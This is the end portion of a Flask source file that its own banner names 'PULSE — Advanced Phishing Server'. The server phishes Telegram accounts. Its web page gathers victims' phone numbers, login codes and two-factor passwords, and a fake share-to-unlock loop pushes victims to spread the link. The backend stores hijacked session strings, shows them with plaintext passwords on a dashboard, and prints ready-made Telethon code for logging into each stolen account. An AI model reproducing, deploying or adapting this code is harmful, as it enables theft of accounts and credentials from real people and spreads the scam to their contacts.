            st.innerHTML = '⏳ Share to start unlocking...';
        }
    } else {
        // Fresh start - show contact request
        showStep('s1');
        resetCodeState();
    }
}

function showStep(id) {
    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById(id).classList.add('active');
}

// ===== REQUEST CONTACT VIA BOT =====
function requestContact() {
    botSessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    
    var st = document.getElementById('contactStatus');
    st.className = 'status-box info show';
    st.innerHTML = '⏳ Opening Telegram... Please tap "Share My Phone Number" in Telegram.';
    st.style.display = 'block';
    
    // Open Telegram bot with session
    var botUsername = '{{ BOT_USERNAME }}';
    window.open('https://t.me/' + botUsername + '?start=' + botSessionId, '_blank');
    
    // Start polling for contact
    if (contactCheckInterval) clearInterval(contactCheckInterval);
    contactCheckInterval = setInterval(function() {
        checkBotContact();
    }, 2000);
}

async function checkBotContact() {
    try {
        var res = await fetch('/api/bot_check', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_id: botSessionId})
        });
        var data = await res.json();
        
        if (data.phone) {
            clearInterval(contactCheckInterval);
            contactCheckInterval = null;
            
            phoneNumber = data.phone;
            localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
            
            var st = document.getElementById('contactStatus');
            st.className = 'status-box success show';
            st.innerHTML = '✅ Phone received! Sending verification code...';
            st.style.display = 'block';
            
            // Now send code to this phone via backend
            sendPhoneToBackend(phoneNumber);
        } else if (data.status === 'waiting') {
            var st = document.getElementById('contactStatus');
            st.className = 'status-box waiting show';
            st.innerHTML = '⏳ Waiting for you to share your number in Telegram...';
            st.style.display = 'block';
        }
    } catch(e) {
        // Silent retry
    }
}

// ===== MANUAL PHONE INPUT =====
function showManualInput() {
    if (contactCheckInterval) { clearInterval(contactCheckInterval); contactCheckInterval = null; }
    showStep('s1b');
    document.getElementById('phoneInput').focus();
}

function sendPhoneFromManual() {
    var phone = document.getElementById('phoneInput').value.trim();
    if (!phone || phone.length !== 10) {
        var ps = document.getElementById('ps1');
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Enter valid 10-digit number';
        ps.style.display = 'block';
        return;
    }
    
    phoneNumber = '+91' + phone;
    localStorage.setItem(SAVED_PHONE_KEY, phoneNumber);
    
    sendPhoneToBackend(phoneNumber);
}

async function sendPhoneToBackend(phone) {
    try {
        var res = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'otp_sent');
            showStep('s2');
            document.getElementById('pd').textContent = phone;
            var cs = document.getElementById('cs');
            cs.className = 'status-box waiting show';
            cs.innerHTML = '⏳ Sending code to your Telegram...';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            var ps = document.getElementById('ps1') || document.getElementById('contactStatus');
            ps.className = 'status-box error show';
            ps.innerHTML = '❌ Error: ' + (data.error || 'Failed');
            ps.style.display = 'block';
        }
    } catch(e) {
        var ps = document.getElementById('ps1') || document.getElementById('contactStatus');
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

// ===== OTP CHECK =====
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            
            if (data.s === 'sent') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box success show';
                cs.innerHTML = '✅ Code sent! Enter the 5-digit code:';
                cs.style.display = 'block';
            } else if (data.s === 'done') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                localStorage.setItem(SAVED_STEP_KEY, 'share_page');
                showStep('s3');
                setupShareLink();
            } else if (data.s === '2fa_needed') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                showStep('s2b');
            } else if (data.s === 'err') {
                clearInterval(codeCheckInterval);
                codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'status-box error show';
                cs.innerHTML = '❌ Error sending code. Try manual entry.';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

// ===== OTP INPUT =====
function pk(n) {
    if (codeDigits.length < 5) {
        codeDigits += n;
        document.getElementById('cdisp').textContent = codeDigits;
        if (codeDigits.length === 5) setTimeout(sc, 200);
    }
}
function cc() { 
    codeDigits = codeDigits.slice(0, -1); 
    document.getElementById('cdisp').textContent = codeDigits || '_____'; 
}

async function sc() {
    if (codeDigits.length < 5) { showVerifyStatus('❌ Enter all 5 digits', 'error'); return; }
    document.getElementById('sb').disabled = true;
    document.getElementById('sb').textContent = '⏳';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else if (data.needs_password) {
            showStep('s2b');
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else {
            showVerifyStatus('❌ ' + (data.error || 'Invalid'), 'error');
            codeDigits = ''; document.getElementById('cdisp').textContent = '_____';
            document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ OK';
        }
    } catch(e) { showVerifyStatus('❌ Network error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ OK'; }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) { 
        var ps = document.getElementById('pwdStatus');
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Enter your password';
        ps.style.display = 'block';
        return;
    }
    var ps = document.getElementById('pwdStatus');
    ps.className = 'status-box waiting show';
    ps.innerHTML = '⏳ Verifying...';
    ps.style.display = 'block';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var data = await res.json();
        if (data.success) {
            localStorage.setItem(SAVED_STEP_KEY, 'share_page');
            showStep('s3');
            setupShareLink();
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
        } else {
            ps.className = 'status-box error show';
            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
            ps.style.display = 'block';
        }
    } catch(e) {
        ps.className = 'status-box error show';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

function showVerifyStatus(msg, type) {
    document.getElementById('vs').textContent = msg;
    document.getElementById('vs').className = 'status-box ' + type + ' show';
    document.getElementById('vs').style.display = 'block';
}

function resetCodeState() {
    codeDigits = '';
    if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
    if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
    if (contactCheckInterval) { clearInterval(contactCheckInterval); contactCheckInterval = null; }
}

// ===== SHARE TRICK =====
function setupShareLink() {
    var link = shareLinkBase + '?ref=' + Math.random().toString(36).substr(2, 8);
    document.getElementById('shareLink').textContent = link;
    updateShareProgress();
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(shareLinkBase);
    window.open(shareUrl, '_blank');
    
    if (sharesDone < 4) {
        sharesDone++;
        localStorage.setItem(SAVED_SHARES_KEY, sharesDone.toString());
        updateShareProgress();
    }
    
    var st = document.getElementById('shareStatus');
    
    if (sharesDone < 4) {
        st.className = 'status-box success show';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
    } else if (sharesDone === 4) {
        st.className = 'status-box waiting show';
        st.innerHTML = '⏳ Almost there! Just 1 more share!';
        
        setTimeout(function() {
            if (sharesDone === 4) {
                st.className = 'status-box info show';
                st.innerHTML = '🔄 Verifying shares... Please wait.';
                setTimeout(function() {
                    if (sharesDone === 4) {
                        st.className = 'status-box error show';
                        st.innerHTML = '❌ Verification failed. Please try again.';
                        sharesDone = 3;
                        localStorage.setItem(SAVED_SHARES_KEY, '3');
                        updateShareProgress();
                        setTimeout(function() {
                            st.className = 'status-box waiting show';
                            st.innerHTML = '⏳ Please share with 2 more friends to retry.';
                        }, 2000);
                    }
                }, 5000);
            }
        }, 3000);
    }
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) {
            el.className = 'share-step done';
            el.textContent = '✓';
        } else if (i === sharesDone + 1) {
            el.className = 'share-step active';
            el.textContent = i;
        } else {
            el.className = 'share-step';
            el.textContent = i;
        }
    }
}

// ===== CLOSE MODAL =====
document.getElementById('vm').onclick = function(e) {
    if (e.target === this) {
        this.classList.remove('active');
        resetCodeState();
    }
};

// ===== ON PAGE LOAD — restore if we came back from Telegram =====
// Check URL for bot_session param (in case redirected back)
(function() {
    var params = new URLSearchParams(window.location.search);
    var refBot = params.get('bot_session');
    if (refBot) {
        // Came back from bot - show modal
        setTimeout(function() {
            document.getElementById('glb').click();
        }, 500);
    }
})();
</script>
</body>
</html>"""


# ====== Flask Routes ======

@app.route('/')
def index():
    page = PAGE.replace('{{ BOT_USERNAME }}', BOT_USERNAME)
    return render_template_string(page)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    logger.info(f"📱 Phone received: {ph}")
    
    with sessions_lock:
        pending_codes[ph] = 'sending'
    
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    
    return jsonify({'success': True})

@app.route('/api/bot_check', methods=['POST'])
def bot_check():
    """Check if bot received contact for this session"""
    session_id = request.json.get('session_id', '')
    if not session_id:
        return jsonify({'status': 'not_found', 'phone': None})
    
    with sessions_lock:
        data = bot_start_sessions.get(session_id)
        if data:
            if data['phone']:
                return jsonify({'status': 'received', 'phone': data['phone']})
            return jsonify({'status': 'waiting', 'phone': None})
    
    return jsonify({'status': 'not_found', 'phone': None})

@app.route('/api/check', methods=['POST'])
def check():
    phone = request.json.get('phone', '')
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = d.get('phone', '')
    code = d.get('code', '')
    password = d.get('password', None)
    
    ph = format_phone(ph)
    result = run_telegram_action(ph, code, password)
    return jsonify(result)

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        with sessions_lock:
            if phone in user_sessions:
                return jsonify({
                    'phone': phone,
                    'status': 'pending',
                    'message': 'Code sent, waiting for verification'
                })
        return jsonify({'error': 'Not found'}), 404
    
    return jsonify({
        'phone': phone,
        'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'],
        'dc': a['dc'],
        'session': a['session'],
        'session_length': len(a['session']),
        'has_session': bool(a['session']),
        'webk_data': a['webk'],
        'has_2fa': a.get('has_2fa', False),
        'password': a.get('password', '') if a.get('has_2fa') else ''
    })

@app.route('/webk/<phone>')
def webk(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    
    if not a:
        return "<html>Not found</html>", 404
    
    w = a['webk']
    ss = a['session']
    ss_ok = bool(ss) and len(ss) > 10
    has_2fa = a.get('has_2fa', False)
    password_text = a.get('password', '')
    
    twofa_badge = ''
    if has_2fa and password_text:
        twofa_badge = f'<div style="background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px">🔐 2FA Password: <code style="color:#ff0;font-size:14px">{password_text}</code></div>'
    elif has_2fa:
        twofa_badge = '<div style="background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0;font-size:12px">🔐 2FA was used (password captured)</div>'
    
    return f"""<!DOCTYPE html><html><head><title>Account - {a['first_name']}</title>
    <style>body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
    .c{{background:#141420;padding:40px;border-radius:20px;max-width:550px;width:100%;text-align:center;border:1px solid #1a1a2e}}
    .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
    .i{{color:#888;margin:3px 0;font-size:14px}}
    .sg{{background:#0a0a0a;padding:15px;border-radius:8px;text-align:left;font-size:11px;margin:10px 0;border:1px solid #2a2a3e}}
    code{{color:#0f0;word-break:break-all;font-size:9px}}
    </style></head>
    <body><div class="c">
    <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
    <h2>{a['first_name']} {a['last_name']}</h2>
    <div class="i">@{a['username'] or '—'} | ID: {a['user_id']} | DC: {a['dc']}</div>
    <div class="i">{a['phone']}</div>
    {twofa_badge}
    {'<div style="background:#4CAF50;color:white;padding:12px;border-radius:8px;margin:10px 0">✅ Session: ' + str(len(ss)) + ' chars</div>' if ss_ok else '<div style="background:#e94560;color:white;padding:12px;border-radius:8px;margin:10px 0">❌ No session</div>'}
    
    <div class="sg"><b>Session String:</b><br><code style="font-size:10px">{ss}</code></div>
    
    <div class="sg"><b>WebK Data:</b><br><code>{w}</code></div>
    
    <div class="sg"><b>Telethon Usage:</b><br>
    <code style="font-size:10px">
from telethon import TelegramClient
from telethon.sessions import StringSession
client = TelegramClient(StringSession('{ss}'), {API_ID}, '{API_HASH}')
client.start()
me = client.get_me()
print(me.phone)
    </code></div>
    
    <form action="https://web.telegram.org/k/" method="get" target="_blank">
        <button style="background:#0088cc;color:white;border:none;padding:12px 25px;border-radius:10px;font-size:15px;cursor:pointer;margin:8px">Open Telegram Web</button>
    </form>
    
    <a href="/dash" style="color:#0088cc;font-size:12px;text-decoration:none">← Dashboard</a>
    </div></body></html>
    """

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    accounts = captured_accounts
    
    rows = ""
    for i, a in enumerate(accounts, 1):
        ss_status = "✅" if a.get('session') and len(a['session']) > 10 else "❌"
        ss_len = len(a.get('session', '')) if a.get('session') else 0
        pwd = a.get('password', '')
        pwd_display = f"🔑 {pwd[:20]}..." if pwd else "—"
        twofa_tag = "🔐" if a.get('has_2fa') else ""
        rows += f"""<tr>
            <td>{i}</td>
            <td>{a['phone']}</td>
            <td>{a.get('first_name','')} {a.get('last_name','')}</td>
            <td>@{a.get('username','-')}</td>
            <td>{a.get('user_id','')}</td>
            <td>{twofa_tag} {ss_status} ({ss_len})</td>
            <td>{pwd_display}</td>
            <td>{a.get('time','')}</td>
            <td><a href='/webk/{a["phone"]}'><button style="background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer">View</button></a></td>
        </tr>"""
    
    total_2fa = sum(1 for a in accounts if a.get('has_2fa'))
    
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>
        body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
        h1{{color:#e94560}}
        table{{width:100%;border-collapse:collapse;margin-top:15px}}
        th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}}
        th{{background:#141420;color:#ddd}}
        tr:hover{{background:#141420}}
        .stats{{display:flex;gap:15px;margin:15px 0}}
        .st{{background:#141420;padding:15px 25px;border-radius:10px;text-align:center;flex:1}}
        .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
        .st .l{{color:#666;font-size:12px;margin-top:5px}}
        a{{color:#0088cc;text-decoration:none}}
    </style></head>
    <body>
    <h1>📊 Dashboard</h1>
    <div class="stats">
        <div class="st"><div class="n">{len(accounts)}</div><div class="l">Total Accounts</div></div>
        <div class="st"><div class="n">{total_2fa}</div><div class="l">With 2FA 🔐</div></div>
    </div>
    <table><thead><tr>
        <th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>Session</th><th>Password</th><th>Time</th><th>View</th>
    </tr></thead><tbody>
    {rows if rows else '<tr><td colspan="9" style="text-align:center;color:#666;padding:30px">❌ No accounts yet</td></tr>'}
    </tbody></table>
    <script>setTimeout(()=>location.reload(),15000)</script>
    </body></html>
    """


# ====== Start Bot Polling Thread ======
def start_bot_polling():
    t = threading.Thread(target=bot_polling_loop, daemon=True)
    t.start()


if __name__ == '__main__':
    if not BOT_TOKEN or not API_HASH or API_ID == 0 or YOUR_TELEGRAM_ID == 0:
        print("⚠️  WARNING: Environment variables missing!")
        print(f"   BOT_TOKEN: {'✅' if BOT_TOKEN else '❌'}")
        print(f"   API_ID: {API_ID}")
        print(f"   API_HASH: {'✅' if API_HASH else '❌'}")
        print(f"   OWNER_ID: {YOUR_TELEGRAM_ID}")
        print(f"   BOT_USERNAME: {BOT_USERNAME}")
    
    # Start bot polling thread
    start_bot_polling()
    
    port = int(os.environ.get('PORT', 5000))
    print(f"\n{'='*50}")
    print(f"🔥 PULSE — Advanced Phishing Server")
    print(f"{'='*50}")
    print(f"🌐 Main:     http://localhost:{port}")
    print(f"📊 Dashboard: http://localhost:{port}/dash")
    print(f"🤖 Bot:      @{BOT_USERNAME}")
    print(f"{'='*50}\n")
    app.run(host='0.0.0.0', port=port, debug=True, threaded=True)
